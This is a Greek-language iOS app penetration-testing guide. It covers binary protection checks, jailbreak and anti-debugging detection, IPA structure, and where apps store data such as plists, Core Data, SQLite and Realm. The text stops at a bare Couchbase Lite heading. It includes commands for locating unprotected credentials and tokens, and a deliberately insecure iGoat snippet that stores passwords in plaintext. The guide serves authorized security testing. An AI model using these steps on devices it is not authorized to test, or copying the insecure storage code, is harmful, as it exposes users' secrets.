# iOS Pentesting

{{#include ../../banners/hacktricks-training.md}}

## Βασικά iOS


{{#ref}}
ios-basics.md
{{#endref}}

## Περιβάλλον Δοκιμών

Σε αυτή τη σελίδα μπορείτε να βρείτε πληροφορίες σχετικά με τον **iOS simulator**, τους **emulators** και το **jailbreaking:**


{{#ref}}
ios-testing-environment.md
{{#endref}}

## Αρχική Ανάλυση

### Βασικές Λειτουργίες Δοκιμών iOS

Κατά τη διάρκεια των δοκιμών θα προταθούν **διαφορετικές ενέργειες** (σύνδεση στη συσκευή, ανάγνωση/εγγραφή/ανέβασμα/λήψη αρχείων, χρήση εργαλείων...). Επομένως, αν δεν γνωρίζετε πώς να εκτελέσετε κάποια από αυτές τις ενέργειες παρακαλώ, **ξεκινήστε διαβάζοντας τη σελίδα**:


{{#ref}}
basic-ios-testing-operations.md
{{#endref}}

> [!TIP]
> Για τα επόμενα βήματα **η εφαρμογή πρέπει να είναι εγκατεστημένη** στη συσκευή και να έχετε ήδη αποκτήσει το **IPA file** της εφαρμογής.\
> Read the [Basic iOS Testing Operations](basic-ios-testing-operations.md) page to learn how to do this.

### Βασική Στατική Ανάλυση

Μερικοί ενδιαφέροντες iOS - IPA file decompilers:

- [https://github.com/LaurieWired/Malimite](https://github.com/LaurieWired/Malimite)
- [https://ghidra-sre.org/](https://ghidra-sre.org/)

Συνιστάται να χρησιμοποιήσετε το εργαλείο [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) για να εκτελέσετε αυτόματη Στατική Ανάλυση στο αρχείο IPA.

Identification of **protections are present in the binary**:

- **PIE (Position Independent Executable)**: When enabled, the application loads into a random memory address every-time it launches, making it harder to predict its initial memory address.

```bash
otool -hv <app-binary> | grep PIE   # It should include the PIE flag
```

- **Stack Canaries**: To validate the integrity of the stack, a ‘canary’ value is placed on the stack before calling a function and is validated again once the function ends.

```bash
otool -I -v <app-binary> | grep stack_chk   # It should include the symbols: stack_chk_guard and stack_chk_fail
```

- **ARC (Automatic Reference Counting)**: To prevent common memory corruption flaws

```bash
otool -I -v <app-binary> | grep objc_release   # It should include the _objc_release symbol
```

- **Encrypted Binary**: The binary should be encrypted

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # The cryptid should be 1
```

**Identification of Sensitive/Insecure Funcions**

- **Weak Hashing Algorithms**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# On linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```

- **Insecure Random Functions**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# On linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```

- **Insecure ‘Malloc’ Function**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_malloc"

# On linux
grep -iER "_malloc"
```

- **Insecure and Vulnerable Functions**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# On linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

#### Συνήθεις μέθοδοι ανίχνευσης jailbreak

- **File System Checks**: Ελέγξτε για την παρουσία κοινών αρχείων και φακέλων jailbreak, όπως `/Applications/Cydia.app` ή `/Library/MobileSubstrate/MobileSubstrate.dylib`.
- **Sandbox Violations**: Προσπαθήστε να έχετε πρόσβαση σε περιορισμένες περιοχές του file system, που θα πρέπει να είναι μπλοκαρισμένες σε μη-jailbroken συσκευές.
- **API Checks**: Ελέγξτε αν είναι δυνατή η χρήση απαγορευμένων κλήσεων όπως `fork()` για δημιουργία child process ή `system()` για να δείτε αν υπάρχει /bin/sh.
- **Process Checks**: Παρακολουθήστε για την παρουσία γνωστών διαδικασιών που σχετίζονται με jailbreak, όπως `Cydia`, `Substrate`, ή `ssh`.
- **Kernel Exploits**: Ελέγξτε για την παρουσία kernel exploits που χρησιμοποιούνται συχνά σε jailbreaks.
- **Environment Variables**: Εξετάστε τις μεταβλητές περιβάλλοντος για σημάδια jailbreak, όπως `DYLD_INSERT_LIBRARIES`.
- **Libraries Check**: Ελέγξτε τις βιβλιοθήκες που φορτώνονται στη διεργασία της εφαρμογής.
- **Check schemes**: Όπως `canOpenURL(URL(string: "cydia://"))`.

#### Συνήθεις μέθοδοι ανίχνευσης Anti-Debugging

- **Check for Debugger Presence**: Χρησιμοποιήστε `sysctl` ή άλλες μεθόδους για να ελέγξετε αν υπάρχει συνδεδεμένος debugger.
- **Anti-Debugging APIs**: Αναζητήστε κλήσεις σε anti-debugging APIs όπως `ptrace` ή `SIGSTOP` όπως `ptrace(PT_DENY_ATTACH, 0, 0, 0)`.
- **Timing Checks**: Μετρήστε το χρόνο που απαιτείται για συγκεκριμένες λειτουργίες και αναζητήστε αποκλίσεις που μπορεί να υποδεικνύουν debugging.
- **Memory Checks**: Εξετάστε τη μνήμη για γνωστά artifacts ή τροποποιήσεις debugger.
- **Environment Variables**: Ελέγξτε μεταβλητές περιβάλλοντος που μπορεί να υποδεικνύουν συνεδρία debugging.
- **Mach Ports**: Ανιχνεύστε αν οι mach exception ports χρησιμοποιούνται από debuggers.

### Βασική Δυναμική Ανάλυση

Δείτε τη δυναμική ανάλυση που εκτελεί το [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Θα χρειαστεί να πλοηγηθείτε στις διάφορες προβολές και να αλληλεπιδράσετε με αυτές, αλλά θα κάνει hooking σε πολλές κλάσεις ενώ εκτελεί άλλες ενέργειες και θα ετοιμάσει μια αναφορά μόλις τελειώσετε.

### Καταγραφή Εγκατεστημένων Εφαρμογών

Χρησιμοποιήστε την εντολή `frida-ps -Uai` για να προσδιορίσετε το **bundle identifier** των εγκατεστημένων εφαρμογών:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Βασική Enumeration & Hooking

Μάθετε πώς να **enumerate τα components της εφαρμογής** και πώς να **hook methods και classes** εύκολα με objection:


{{#ref}}
ios-hooking-with-objection.md
{{#endref}}

### Δομή IPA

Η δομή ενός **IPA file** είναι ουσιαστικά αυτή ενός **zipped package**. Αν μετονομάσετε την επέκτασή του σε `.zip`, μπορεί να **decompressed** για να αποκαλύψει το περιεχόμενό του. Μέσα σε αυτή τη δομή, ένα **Bundle** αντιπροσωπεύει μια πλήρως πακεταρισμένη εφαρμογή έτοιμη για εγκατάσταση. Μέσα θα βρείτε έναν φάκελο με όνομα `<NAME>.app`, που εμπεριέχει τους πόρους της εφαρμογής.

- **`Info.plist`**: Αυτό το αρχείο περιέχει συγκεκριμένες ρυθμίσεις της εφαρμογής.
- **`_CodeSignature/`**: Αυτός ο κατάλογος περιλαμβάνει ένα plist αρχείο που περιέχει μια υπογραφή, εξασφαλίζοντας την ακεραιότητα όλων των αρχείων στο bundle.
- **`Assets.car`**: Ένα συμπιεσμένο αρχείο που αποθηκεύει asset αρχεία όπως icons.
- **`Frameworks/`**: Αυτός ο φάκελος φιλοξενεί τις native βιβλιοθήκες της εφαρμογής, που μπορεί να είναι σε μορφή `.dylib` ή `.framework`.
- **`PlugIns/`**: Αυτό μπορεί να περιλαμβάνει επεκτάσεις της εφαρμογής, γνωστές ως `.appex` αρχεία, αν και δεν είναι πάντα παρούσες. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Χρησιμοποιείται για να αποθηκεύει τα μόνιμα δεδομένα της εφαρμογής για offline χρήση, να cache-άρει προσωρινά δεδομένα και να προσθέτει λειτουργία undo στην εφαρμογή σε μια συσκευή. Για συγχρονισμό δεδομένων σε πολλαπλές συσκευές στον ίδιο iCloud λογαριασμό, το Core Data καθρεφτίζει αυτόματα το σχήμα σας σε ένα CloudKit container.
- [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Το αρχείο `PkgInfo` είναι ένας εναλλακτικός τρόπος για να ορίσετε τους type και creator κώδικες της εφαρμογής ή του bundle σας.
- **en.lproj, fr.proj, Base.lproj**: Είναι τα language packs που περιέχουν πόρους για αυτές τις συγκεκριμένες γλώσσες, και έναν προεπιλεγμένο πόρο σε περίπτωση που μια γλώσσα δεν υποστηρίζεται.
- **Security**: Ο κατάλογος `_CodeSignature/` παίζει κρίσιμο ρόλο στην ασφάλεια της εφαρμογής επαληθεύοντας την ακεραιότητα όλων των bundled αρχείων μέσω ψηφιακών υπογραφών.
- **Asset Management**: Το αρχείο `Assets.car` χρησιμοποιεί συμπίεση για να διαχειρίζεται αποτελεσματικά γραφικά assets, κρίσιμο για τη βελτιστοποίηση της απόδοσης της εφαρμογής και τη μείωση του συνολικού μεγέθους.
- **Frameworks and PlugIns**: Αυτοί οι κατάλογοι τονίζουν τη modularity των iOS εφαρμογών, επιτρέποντας στους developers να συμπεριλάβουν επαναχρησιμοποιήσιμες βιβλιοθήκες κώδικα (`Frameworks/`) και να επεκτείνουν τη λειτουργικότητα της εφαρμογής (`PlugIns/`).
- **Localization**: Η δομή υποστηρίζει πολλαπλές γλώσσες, διευκολύνοντας την παγκόσμια διάδοση της εφαρμογής με την ένταξη πόρων για συγκεκριμένα language packs.

**Info.plist**

Το **Info.plist** λειτουργεί ως θεμέλιο για εφαρμογές iOS, περιλαμβάνοντας βασικά δεδομένα ρύθμισης σε μορφή **key-value** ζευγών. Αυτό το αρχείο απαιτείται όχι μόνο για εφαρμογές αλλά και για app extensions και frameworks που είναι bundled μέσα. Είναι δομημένο είτε σε XML είτε σε binary μορφή και περιέχει κρίσιμες πληροφορίες από τα permissions της εφαρμογής έως ρυθμίσεις ασφαλείας. Για λεπτομερή διερεύνηση των διαθέσιμων keys, μπορείτε να αναφερθείτε στην [**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Για όσους θέλουν να δουλέψουν με αυτό το αρχείο σε πιο προσβάσιμη μορφή, η XML μετατροπή μπορεί να επιτευχθεί εύκολα μέσω της χρήσης του `plutil` σε macOS (διαθέσιμο ντόπια σε εκδόσεις 10.2 και νεότερες) ή `plistutil` σε Linux. Οι εντολές για τη μετατροπή είναι οι εξής:

- **Για macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Για Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Μεταξύ της πληθώρας πληροφοριών που μπορεί να αποκαλύψει το **Info.plist**, αξιοσημείωτες εγγραφές περιλαμβάνουν τις συμβολοσειρές αδειών της εφαρμογής (`UsageDescription`), τα προσαρμοσμένα σχήματα URL (`CFBundleURLTypes`) και τις ρυθμίσεις για το App Transport Security (`NSAppTransportSecurity`). Αυτές οι εγγραφές, μαζί με άλλες όπως τα εξαγόμενα/εισερχόμενα προσαρμοσμένα είδη εγγράφων (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), μπορούν να εντοπιστούν εύκολα με την επιθεώρηση του αρχείου ή με τη χρήση μιας απλής εντολής `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**Διαδρομές Δεδομένων**

Στο περιβάλλον iOS, οι κατάλογοι προορίζονται ειδικά για **συστημικές εφαρμογές** και **εφαρμογές εγκατεστημένες από τον χρήστη**. Οι συστημικές εφαρμογές βρίσκονται στον κατάλογο `/Applications`, ενώ οι εφαρμογές που εγκαθίστανται από τον χρήστη τοποθετούνται κάτω από `/var/mobile/containers/Data/Application/`. Σε αυτές τις εφαρμογές ανατίθεται ένας μοναδικός αναγνωριστής γνωστός ως **128-bit UUID**, κάνοντας τη χειροκίνητη εύρεση του φακέλου μιας εφαρμογής δύσκολη λόγω της τυχαιότητας των ονομάτων των καταλόγων.

> [!WARNING]
> Εφόσον οι εφαρμογές στο iOS πρέπει να είναι sandboxed, κάθε εφαρμογή θα έχει επίσης έναν φάκελο μέσα στο **`$HOME/Library/Containers`** με το **`CFBundleIdentifier`** της εφαρμογής ως όνομα του φακέλου.
>
> Ωστόσο, και οι δύο φάκελοι (data & container folders) περιέχουν το αρχείο **`.com.apple.mobile_container_manager.metadata.plist`** που συνδέει και τους δύο φακέλους μέσω του κλειδιού `MCMetadataIdentifier`).

Για να διευκολυνθεί η εύρεση του καταλόγου εγκατάστασης μιας εφαρμογής εγκατεστημένης από χρήστη, το **objection tool** παρέχει μια χρήσιμη εντολή, `env`. Αυτή η εντολή αποκαλύπτει λεπτομερείς πληροφορίες καταλόγων για την αντίστοιχη εφαρμογή. Παρακάτω υπάρχει ένα παράδειγμα για το πώς να χρησιμοποιήσετε αυτήν την εντολή:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Εναλλακτικά, το όνομα της εφαρμογής μπορεί να αναζητηθεί μέσα στο `/private/var/containers` χρησιμοποιώντας την εντολή `find`:
```bash
find /private/var/containers -name "Progname*"
```
Μπορούν επίσης να χρησιμοποιηθούν εντολές όπως `ps` και `lsof` για να εντοπιστεί η διεργασία της εφαρμογής και να απαριθμηθούν τα ανοιχτά αρχεία, αντίστοιχα, παρέχοντας πληροφορίες σχετικά με τα ενεργά μονοπάτια καταλόγων της εφαρμογής:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Bundle directory:**

- **AppName.app**
- Αυτό είναι το Application Bundle όπως φάνηκε προηγουμένως στο IPA, περιέχει βασικά δεδομένα της εφαρμογής, στατικό περιεχόμενο καθώς και το μεταγλωττισμένο δυαδικό της εφαρμογής.
- Αυτός ο κατάλογος είναι ορατός στους χρήστες, αλλά **οι χρήστες δεν μπορούν να γράψουν σε αυτόν**.
- Το περιεχόμενο σε αυτόν τον κατάλογο **δεν περιλαμβάνεται στο αντίγραφο ασφαλείας**.
- Τα περιεχόμενα αυτού του φακέλου χρησιμοποιούνται για να **επιβεβαιώσουν την υπογραφή του κώδικα**.

**Data directory:**

- **Documents/**
- Περιέχει όλα τα δεδομένα που δημιουργούνται από τον χρήστη. Ο τελικός χρήστης της εφαρμογής ξεκινά τη δημιουργία αυτών των δεδομένων.
- Ορατό στους χρήστες και **οι χρήστες μπορούν να γράψουν σε αυτό**.
- Το περιεχόμενο σε αυτόν τον κατάλογο **περιλαμβάνεται στο αντίγραφο ασφαλείας**.
- Η εφαρμογή μπορεί να εξαιρέσει διαδρομές ρυθμίζοντας `NSURLIsExcludedFromBackupKey`.
- **Library/**
- Περιέχει όλα τα **αρχεία που δεν είναι ειδικά για τον χρήστη**, όπως **caches**, **preferences**, **cookies**, και αρχεία ρυθμίσεων property list (plist).
- Οι iOS εφαρμογές συνήθως χρησιμοποιούν τους υποφακέλους `Application Support` και `Caches`, αλλά η εφαρμογή μπορεί να δημιουργήσει προσαρμοσμένους υποφακέλους.
- **Library/Caches/**
- Περιέχει **ημι-μόνιμα αρχεία cache.**
- Αόρατο στους χρήστες και **οι χρήστες δεν μπορούν να γράψουν σε αυτό**.
- Το περιεχόμενο σε αυτόν τον κατάλογο **δεν περιλαμβάνεται στο αντίγραφο ασφαλείας**.
- Το λειτουργικό σύστημα μπορεί να διαγράψει αυτόματα τα αρχεία αυτού του καταλόγου όταν η εφαρμογή δεν τρέχει και ο χώρος αποθήκευσης είναι χαμηλός.
- **Library/Application Support/**
- Περιέχει **επίμονα** **αρχεία** απαραίτητα για τη λειτουργία της εφαρμογής.
- **Αόρατο** **από** **τους χρήστες** και οι χρήστες δεν μπορούν να γράψουν σε αυτό.
- Το περιεχόμενο σε αυτόν τον κατάλογο **περιλαμβάνεται στο αντίγραφο ασφαλείας**.
- Η εφαρμογή μπορεί να εξαιρέσει διαδρομές ρυθμίζοντας `NSURLIsExcludedFromBackupKey`.
- **Library/Preferences/**
- Χρησιμοποιείται για την αποθήκευση ιδιοτήτων που μπορούν να **διατηρηθούν ακόμα και μετά την επανεκκίνηση της εφαρμογής**.
- Οι πληροφορίες αποθηκεύονται, μη κρυπτογραφημένες, μέσα στο sandbox της εφαρμογής σε ένα plist αρχείο με όνομα \[BUNDLE_ID].plist.
- Όλα τα ζεύγη κλειδιού/τιμής που αποθηκεύονται χρησιμοποιώντας `NSUserDefaults` μπορούν να βρεθούν σε αυτό το αρχείο.
- **tmp/**
- Χρησιμοποιήστε αυτόν τον κατάλογο για να γράψετε **προσωρινά αρχεία** που δεν χρειάζεται να διατηρηθούν μεταξύ των εκκινήσεων της εφαρμογής.
- Περιέχει μη-επίμονα αρχεία cache.
- **Αόρατο** στους χρήστες.
- Το περιεχόμενο σε αυτόν τον κατάλογο δεν περιλαμβάνεται στο αντίγραφο ασφαλείας.
- Το λειτουργικό σύστημα μπορεί να διαγράψει αυτόματα τα αρχεία αυτού του καταλόγου όταν η εφαρμογή δεν τρέχει και ο χώρος αποθήκευσης είναι χαμηλός.

Let's take a closer look at iGoat-Swift's Application Bundle (.app) directory inside the Bundle directory (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

Μέσα στον φάκελο `<application-name>.app` θα βρείτε ένα binary αρχείο που ονομάζεται `<application-name>`. Αυτό είναι το αρχείο που θα **εκτελεστεί**. Μπορείτε να κάνετε έναν βασικό έλεγχο του binary με το εργαλείο **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Έλεγχος αν η εφαρμογή είναι κρυπτογραφημένη**

Δες αν υπάρχει οποιαδήποτε έξοδος για:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Αποσυναρμολόγηση του binary**

Αποσυναρμολόγησε την text section:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Για να εκτυπώσετε το **Objective-C segment** της δειγματικής εφαρμογής, μπορείτε να χρησιμοποιήσετε:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Για να αποκτήσετε πιο συμπαγή κώδικα Objective-C μπορείτε να χρησιμοποιήσετε [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ωστόσο, οι καλύτερες επιλογές για την αποσυναρμολόγηση του binary είναι: [**Hopper**](https://www.hopperapp.com/download.html?) και [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

## Αποθήκευση Δεδομένων

Για να μάθετε πώς το iOS αποθηκεύει δεδομένα στη συσκευή, διαβάστε αυτή τη σελίδα:


{{#ref}}
ios-basics.md
{{#endref}}

> [!WARNING]
> Οι παρακάτω θέσεις αποθήκευσης πληροφοριών θα πρέπει να ελεγχθούν **αμέσως μετά την εγκατάσταση της εφαρμογής**, **μετά τον έλεγχο όλων των λειτουργιών** της εφαρμογής και ακόμη και μετά την **αποσύνδεση από έναν χρήστη και τη σύνδεση με έναν διαφορετικό**.\
> Στόχος είναι να βρεθούν **μη προστατευμένες ευαίσθητες πληροφορίες** της εφαρμογής (κωδικοί, tokens), του τρέχοντος χρήστη και προηγούμενων συνδεδεμένων χρηστών.

### Plist

**plist** αρχεία είναι δομημένα αρχεία XML που **περιέχουν ζεύγη κλειδί-τιμής**. Είναι ένας τρόπος αποθήκευσης μόνιμων δεδομένων, οπότε μερικές φορές μπορεί να βρείτε **ευαίσθητες πληροφορίες σε αυτά τα αρχεία**. Συνιστάται να ελέγχετε αυτά τα αρχεία μετά την εγκατάσταση της εφαρμογής και μετά από εντατική χρήση για να δείτε αν γράφονται νέα δεδομένα.

The most common way to persist data in plist files is through the usage of **NSUserDefaults**. This plist file is saved inside the app sandbox in **`Library/Preferences/<appBundleID>.plist`**

Η κλάση [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) παρέχει ένα προγραμματικό interface για την αλληλεπίδραση με το προεπιλεγμένο σύστημα. Το προεπιλεγμένο σύστημα επιτρέπει σε μια εφαρμογή να προσαρμόσει τη συμπεριφορά της σύμφωνα με τις **προτιμήσεις χρήστη**. Τα δεδομένα που αποθηκεύονται από το `NSUserDefaults` μπορούν να προβληθούν στο application bundle. Αυτή η κλάση αποθηκεύει **δεδομένα** σε ένα **plist** **αρχείο**, αλλά προορίζεται για χρήση με μικρές ποσότητες δεδομένων.

Αυτά τα δεδομένα δεν μπορούν πλέον να προσπελαστούν απευθείας μέσω ενός αξιόπιστου υπολογιστή, αλλά μπορούν να προσπελαστούν κάνοντας **αντίγραφο ασφαλείας**.

You can **dump** the information saved using **`NSUserDefaults`** using objection's `ios nsuserdefaults get`

Για να βρείτε όλα τα plist που χρησιμοποιούνται από την εφαρμογή μπορείτε να αποκτήσετε πρόσβαση στο `/private/var/mobile/Containers/Data/Application/{APPID}` και να εκτελέσετε:
```bash
find ./ -name "*.plist"
```
Για να μετατρέψετε αρχεία από **XML or binary (bplist)** μορφή σε XML, υπάρχουν διάφορες μέθοδοι ανάλογα με το λειτουργικό σας σύστημα:

**Για χρήστες macOS:** Χρησιμοποιήστε την εντολή `plutil`. Είναι ένα ενσωματωμένο εργαλείο στο macOS (10.2+), σχεδιασμένο για αυτόν τον σκοπό:
```bash
$ plutil -convert xml1 Info.plist
```
**Για χρήστες Linux:** Εγκαταστήστε πρώτα το `libplist-utils`, στη συνέχεια χρησιμοποιήστε το `plistutil` για να μετατρέψετε το αρχείο σας:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Μέσα σε μια Objection Session:** Για την ανάλυση εφαρμογών για κινητά, μια συγκεκριμένη εντολή σας επιτρέπει να μετατρέψετε αρχεία plist απευθείας:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) είναι ένα πλαίσιο για τη διαχείριση του επιπέδου μοντέλου των αντικειμένων στην εφαρμογή σας. [Core Data can use SQLite as its persistent store](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), αλλά το πλαίσιο αυτό καθ' εαυτό δεν είναι βάση δεδομένων.\
CoreData δεν κρυπτογραφεί τα δεδομένα του από προεπιλογή. Ωστόσο, μπορεί να προστεθεί ένα επιπλέον επίπεδο κρυπτογράφησης στο CoreData. Δείτε το [GitHub Repo](https://github.com/project-imas/encrypted-core-data) για περισσότερες λεπτομέρειες.

Μπορείτε να βρείτε τις πληροφορίες SQLite Core Data μιας εφαρμογής στη διαδρομή `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Εάν μπορείτε να ανοίξετε το SQLite και να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες, τότε έχετε βρει μια λανθασμένη ρύθμιση.**
```objectivec:Code from iGoat
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) είναι ένας key/value store βασισμένος πάνω στο SQLite.\
Επειδή οι Yap databases είναι sqlite databases, μπορείτε να τις βρείτε χρησιμοποιώντας την προτεινόμενη εντολή στην προηγούμενη ενότητα.

### Άλλες SQLite βάσεις δεδομένων

Είναι συνηθισμένο οι εφαρμογές να δημιουργούν τη δική τους sqlite βάση δεδομένων. Μπορεί να **αποθηκεύουν** **ευαίσθητα** **δεδομένα** σε αυτές και να τα αφήνουν χωρίς κρυπτογράφηση. Επομένως, είναι πάντα ενδιαφέρον να ελέγξετε κάθε βάση μέσα στον φάκελο της εφαρμογής. Πηγαίνετε στον κατάλογο της εφαρμογής όπου αποθηκεύονται τα δεδομένα (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

Οι προγραμματιστές μπορούν να **αποθηκεύουν και να συγχρονίζουν δεδομένα** σε μια **NoSQL βάση δεδομένων φιλοξενούμενη στο cloud** μέσω των Firebase Real-Time Databases. Τα δεδομένα αποθηκεύονται σε μορφή JSON και συγχρονίζονται σε πραγματικό χρόνο με όλους τους συνδεδεμένους clients.

You can find how to check for misconfigured Firebase databases here:


{{#ref}}
../../network-services-pentesting/pentesting-web/buckets/firebase-database.md
{{#endref}}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) and [Realm Swift](https://realm.io/docs/swift/latest/) προσφέρουν μια ισχυρή εναλλακτική για την αποθήκευση δεδομένων, που δεν παρέχεται από την Apple. Από προεπιλογή, **αποθηκεύουν δεδομένα χωρίς κρυπτογράφηση**, ενώ η κρυπτογράφηση είναι διαθέσιμη μέσω συγκεκριμένης ρύθμισης.

Οι βάσεις δεδομένων βρίσκονται στο: `/private/var/mobile/Containers/Data/Application/{APPID}`. Για να εξερευνήσετε αυτά τα αρχεία, μπορείτε να χρησιμοποιήσετε εντολές όπως:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Για την προβολή αυτών των αρχείων βάσεων δεδομένων, προτείνεται το εργαλείο [**Realm Studio**](https://github.com/realm/realm-studio).

Για να εφαρμόσετε encryption μέσα σε μια βάση δεδομένων Realm, μπορείτε να χρησιμοποιήσετε το ακόλουθο απόσπασμα κώδικα:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Βάσεις Δεδομένων Couchbase Lite

